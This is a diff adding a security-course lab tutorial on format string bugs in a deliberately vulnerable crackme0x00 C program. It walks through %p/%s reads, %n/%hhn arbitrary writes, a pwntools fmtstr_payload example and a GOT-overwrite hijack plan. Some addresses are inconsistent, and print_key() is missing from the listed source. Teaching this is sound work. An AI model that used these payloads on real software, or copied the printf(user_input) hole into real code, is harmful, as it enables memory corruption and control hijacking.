@@ -1,0 +1,470 @@
+# Tut05: Format String Vulnerability
+
+In this tutorial, we will explore a powerful new class of bug, 
+called format string vulnerability. This benign-looking bug 
+allows arbitrary read/write and thus arbitrary execution.
+
+## Step 0. Enhanced crackme0x00
+
+We've eliminated the buffer overflow vulnerability in the crackme0x00
+binary. Let's check out the new implementation!
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <err.h>
+
+#include "flag.h"
+
+unsigned int secret = 0xdeadbeef;
+
+void handle_failure(char *buf) {
+  char msg[100];
+  snprintf(msg, sizeof(msg), "Invalid Password! %s\n", buf);
+  printf(msg);
+}
+
+int main(int argc, char *argv[])
+{
+  setreuid(geteuid(), geteuid());
+  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stdin, NULL, _IONBF, 0);
+
+  int tmp = secret;
+
+  char buf[100];
+  printf("IOLI Crackme Level 0x00\n");
+  printf("Password:");
+
+  fgets(buf, sizeof(buf), stdin);
+
+  if (!strcmp(buf, "250382\n")) {
+    printf("Password OK :)\n");
+  } else {
+    handle_failure(buf);
+  }
+
+  if (tmp != secret) {
+    puts("The secret is modified!\n");
+  }
+  
+  return 0;
+}
+
+```
+
+```shell
+$ checksec --file crackme0x00
+[*] '/home/lab05/tut05-fmtstr/crackme0x00'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+As you can see, it is a fully protected binary.
+
+> **NOTE.** These two lines are to make your life easier; they immediately
+      flush your input and output buffers.
+> 
+> ```c
+> setvbuf(stdout, NULL, _IONBF, 0);
+> setvbuf(stdin, NULL, _IONBF, 0);
+> ```
+
+It works as before, but when we type an incorrect password, it
+produces an error message like this:
+
+```
+$ ./crackme0x00
+IOLI Crackme Level 0x00
+Password:asdf
+Invalid Password! asdf
+```
+
+Unfortunately, this program is using `printf()` in a very insecure way.
+
+```c
+snprintf(msg, sizeof(msg), "Invalid Password! %s\n", buf);
+printf(msg);
+```
+
+Please note that `msg` might contain your input (e.g., invalid
+password). If it contains a special format specifier, like `%`,
+`printf()` interprets its format specifier, causing a security issue.
+
+Let's try typing `%p`:
+
+- `%p`: pointer
+- `%s`: string
+- `%d`: int
+- `%x`: hex
+
+```
+$ ./crackme0x00
+IOLI Crackme Level 0x00
+Password:%p
+Invalid Password! 0x64
+```
+
+What's `0x64` as an integer? guess what does it represent in the code?
+
+Let's go crazy by putting more `%p` x 15
+
+```
+$ echo "1=%p|2=%p|3=%p|4=%p|5=%p|6=%p|7=%p|8=%p|9=%p|10=%p|11=%p|12=%p|13=%p|14=%p|15=%p"  | ./crackme0x00
+Password:Invalid Password! 1=0x64|2=0x8048a40|3=0xffe1f428 ...
+```
+
+In fact, this output string is your stack for the printf call:
+
+```c
+1=0x64
+2=0x8048a40
+3=0xffe1f428
+4=0xf7f3ce89
+...
+10=0x61766e49
+11=0x2064696c
+12=0x73736150
+13=0x64726f77
+14=0x3d312021
+15=0x327c7025
+```
+
+Since it's so tedious to keep putting `%p`, printf-like functions
+provide a convenient way to point to the n-th arguments:
+
+```
+| %[nth]$p
+(e.g., %1$p = first argument)
+```
+
+Let's try:
+
+```
+$ echo "%10\$p" | ./crackme0x00
+IOLI Crackme Level 0x00
+Password:Invalid Password! 0x61766e49
+```
+
+> **NOTE.** `\\$` is to avoid the interpretation (e.g., `$PATH`) by the shell.
+
+It matches the 10th stack value listed above.
+
+
+## Step 1. Format String Bug to an Arbitrary Read
+
+Let's exploit this format string bug to write an arbitrary value to an
+arbitrary memory region.
+
+Have you noticed some interesting values in the stack?
+
+```c
+4=0xf7f3ce89
+...
+10=0x61766e49  'Inva'
+11=0x2064696c  'lid '
+12=0x73736150  'Pass'
+13=0x64726f77  'word'
+14=0x3d312021  '! 1='
+15=0x327c7025  '%p|2'
+```
+
+It seems that what we put onto the stack is actually being interpreted
+as an argument. What's going on?
+
+When you invoke a `printf()` function, your arguments passed through the
+stack are placed like these:
+
+```c
+printf("%s", a1, a2 ...)
+
+[ra]
+[  ] --+
+[a1]   |   a1: 1st arg, %1$s
+[a2]   |   a2: 2nd arg, %2$s
+[%s] <-+     : 3rd arg, %3$s
+[..]
+```
+
+In this simple case, you can point to the `%s` (as value) with
+`%3$s`! It means you can 'read' (e.g., 4 bytes) an arbitrary memory
+region like this:
+
+```c
+printf("\xaa\xaa\xaa\xaa%3$s", a1, a2 ...)
+
+[ra ]
+[   ] --+
+[a1 ]   |
+[a2 ]   |
+[ptr] <-+
+[.. ]
+```
+
+It reads (`%s`) 4 bytes at 0xaaaaaaaa and prints out its value. In case
+of the target binary, where is your controllable input located in
+the stack (the _N_ value in the below)?
+
+```sh
+$ echo "BBAAAA%N\$p" | ./crackme0x00
+IOLI Crackme Level 0x00
+Password:Invalid Password! BBAAAA0x41414141
+```
+
+What happens when we replace `%p` with `%s`? How does it crash?
+
+> **[Task]** How could you read the `secret` value?
+> 
+> Note that you can locate the address of secret by using `nm`:
+> 
+> ```sh
+> $ nm crackme0x00 | grep secret
+> 0804a050 D secret
+> ```
+
+## Step 2. Format String Bug to an Arbitrary Write
+
+In fact, `printf()` is very complex, and it supports a 'write': it
+writes the total number of bytes printed so far to the location you
+specified.
+
+- `%n`: write number of bytes printed (as an int)
+
+```c
+printf("aaaa%n", &len);
+```
+
+`len` contains `4` = `strlen("aaaa")` as a result.
+
+Similar to the arbitrary read, you can also write to an arbitrary
+memory location like this:
+
+```c
+printf("\xaa\xaa\xaa\xaa%3$n", a1, a2 ...)
+
+[ra ]
+[   ] --+
+[a1 ]   |
+[a2 ]   |
+[ptr] <-+
+[.. ]
+
+*0xaaaaaaaa = 4 (i.e., \xaa x 4 are printed so far)
+```
+
+Then, how to write an arbitrary value? We need another useful
+specifier of printf:
+
+```
+| %[len]d
+(e.g., %10d: print out 10 spacers)
+```
+
+To write 10 to `0xaaaaaaaa`, you can print 6 more characters like this:
+
+```c
+printf("\xaa\xaa\xaa\xaa%6d%3$n", a1, a2 ...)
+                        ---
+*0xaaaaaaaa = 10
+```
+
+By using this, you can write an arbitrary value to the arbitrary
+location. For example, you can write a value, 0xc0ffee, to the
+location, `0xaaaaaaaa`:
+
+### 1. You can either write four bytes at a time like this:
+
+```c
+*(int *)0xaaaaaaaa = 0x000000ee
+*(int *)0xaaaaaaab = 0x000000ff
+*(int *)0xaaaaaaac = 0x000000c0
+```
+
+### 2. Or you can use these smaller size specifiers like below:
+
+- `%hn`: write the number of printed bytes as a short
+- `%hhn`: write the number of printed bytes as a byte
+
+```c
+printf("\xaa\xaa\xaa\xaa%6d%3$hhn", a1, a2 ...)
+                        ---
+*(unsigned char*)0xaaaaaaaa = 0x10
+```
+
+so,
+
+```c
+*(unsigned char*)0xaaaaaaaa = 0xee
+*(unsigned char*)0xaaaaaaab = 0xff
+*(unsigned char*)0xaaaaaaac = 0xc0
+```
+
+> **[Task]** How could you overwrite the `secret` value with 0xc0ffee?
+
+
+## Step 3. Using pwntool
+
+In fact, it's very tedious to construct the format string that overwrites an
+arbitrary value to an arbitrary location once you understand the core
+idea. Fortunately, pwntool provides a [fmtstr exploit generator](http://docs.pwntools.com/en/stable/fmtstr.html) for you.
+
+```
+fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
+
+- offset: the first formatter's offset you control
+- writes: dict with addr, value {addr: value, addr2: value2}
+- numbwritten: the number of bytes already written by printf()
+```
+
+Let's say we'd like to write `0xc0ffee` to `*0xaaaaaaaa`, and we have a
+control of the fmtstr at the 4th param (i.e., `%4$p`), but we already
+printed out 10 characters.
+
+```sh
+$ python2 -c "from pwn import*; print(fmtstr_payload(4, {0xaaaaaaaa: 0xc0ffee}, 10))"
+\xaa\xaa\xaa\xaa\xab\xaa\xaa\xaa\xac\xaa\xaa\xaa\xad\xaa\xaa\xaa%212c%4$hhn%17c%5$hhn%193c%6$hhn%64c%7$hhn
+```
+
+> **[Task]** Is it similar to what you've come up with to write 0xc0ffee to the
+> `secret` value? Please modify template.py to overwrite the `secret`
+> value!
+
+
+## Step 4. Arbitrary Execution!
+
+Your task today is to launch an control hijacking attack by using this
+fmtstr vulnerability. The plan is simple: overwrite the GOT of `puts()`
+with the address of `print_key()`, so that when `puts()` is invoked, we can
+redirect its execution to `print_key()`.
+
+Just in case, you haven't heard of GOT. **Global Offset Table**, shortly
+**GOT**, is a table whose entry contains an external function pointer
+(e.g., `puts()` or `printf()` in libc). When a dynamic loader (ld)
+initially loads your program, the GOT table is filled with static code
+pointers that ultimately invoke `_dl_runtime_resolve()`, and then, once
+the location of the calling function is resolved, the entry is updated
+with the resolved pointer (i.e., real address of `puts()` and `printf()` in
+libc). Once resolved, the following calls will immediately direct its
+execution to the real functions, as the resolved function pointer is
+updated in the GOT entry.
+
+For example, this is the code snippet for calling `puts()` in the `main()`:
+
+```x86asm
+0x0804891b <+189>:	sub    esp,0xc
+0x0804891e <+192>:	push   0x8048a80
+0x08048923 <+197>:	call   0x8048590 <puts@plt>
+```
+
+Note that `puts@plt` is not the real "`puts()`" in libc; `0x80490a0` is in
+your code section (try, `vmmap 0x80490a0`) and the real `puts()` of libc
+is located here:
+
+```x86asm
+  > x/10i puts
+   0xf7db7b40 <puts>:	push   ebp
+   0xf7db7b41 <puts+1>:	mov    ebp,esp
+   0xf7db7b43 <puts+3>:	push   edi
+   0xf7db7b44 <puts+4>:	push   esi
+```
+
+`puts@plt` means `puts` at the Procedure Linkage Table (PLT); it points
+to one of the entries in PLT:
+
+```x86asm
+> pdisas 0x8048570
+ > 0x8048570 <err@plt>           jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+36] <0x804a024>
+
+   0x8048576 <err@plt+6>         push   0x30
+   0x804857b <err@plt+11>        jmp    0x8048500
+
+   0x8048580 <fread@plt>         jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+40] <0x804a028>
+
+   0x8048586 <fread@plt+6>       push   0x38
+   0x804858b <fread@plt+11>      jmp    0x8048500
+
+   0x8048590 <puts@plt>          jmp    dword ptr [0x804a02c] <0xf7db7b40>
+
+   0x8048596 <puts@plt+6>        push   0x40
+   0x804859b <puts@plt+11>       jmp    0x8048500
+
+   ...
+```
+
+Let's follow this call (i.e., single stepping into the call),
+
+```x86asm
+ > 0x8048590  <puts@plt>       jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+44] <0x804a02c>
+
+   0x8048596  <puts@plt+6>     push   0x40
+   0x804859b  <puts@plt+11>    jmp    0x8048500
+    v
+   0x8048500                   push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] <0x804a004>
+   0x8048506                   jmp    dword ptr [0x804a008]
+    v
+   0xf7fafe10 <_dl_runtime_resolve>       push   eax
+   0xf7fafe11 <_dl_runtime_resolve+1>     push   ecx
+   0xf7fafe12 <_dl_runtime_resolve+2>     push   edx
+```
+
+GOT of `puts()` (i.e., `_GLOBAL_OFFSET_TABLE_+44`) initially points to
+`puts@plt+6`, the right next instruction to `puts@plt`, and ends up invoking
+`_dl_runtime_resolve()` with two parameters, one of which simply
+indicates that `puts()` should be resolved (i.e., 0x30). Once resolved,
+`_GLOBAL_OFFSET_TABLE_+44` (`0x804a02c`) will point to the real `puts()` in
+libc (`0xf7e11b40`).
+
+> **[Task]** So, can you overwrite the GOT entry of `puts()`, and try to hijack by
+> yourself?
+
+In fact, there are two challenges that you will be encountering when
+writing an exploit.
+
+### 1) in order to reach `puts()`, you have to overwrite both the secret value and the GOT of `puts()`:
+
+```c
+if (tmp != secret) {
+  puts("The secret is modified!\n");
+}
+```
+
+> **[Task]** What should be the 'writes' param for `fmtstr_payload()`?
+
+
+### 2) Unfortunately, the size of the buffer is very limited, meaning that it might not be able to contain the format strings for both write targets.
+
+```c
+void handle_failure(char *buf) {
+  char msg[100];
+  ...
+}
+```
+
+Do you remember the `%hn` or `%hhn` tricks that help you overwrite smaller
+number of bytes, like one or two? That's where `write_size` plays a role:
+
+```
+fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
+
+- write_size (str): must be byte, short or int. Tells if you want to
+    write byte by byte, short by short or int by int (hhn, hn or n)
+```
+
+Finally! Can you hijack the `puts()` invocation to `print_key()` to get
+your flag for this tutorial?
+
+> **[Task]** In the given `template.py`, modify the payload
+> to hijack the `puts()` invocation to `print_key()`, and get your flag.
+
+
+## Reference
+
+- [Stack Smashing as of Today](https://www.blackhat.com/presentations/bh-europe-09/Fritsch/Blackhat-Europe-2009-Fritsch-Bypassing-aslr-slides.pdf)
+- [The Advanced Return-into-lib(c) Exploits](http://phrack.org/issues/58/4.html)
+- [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
+
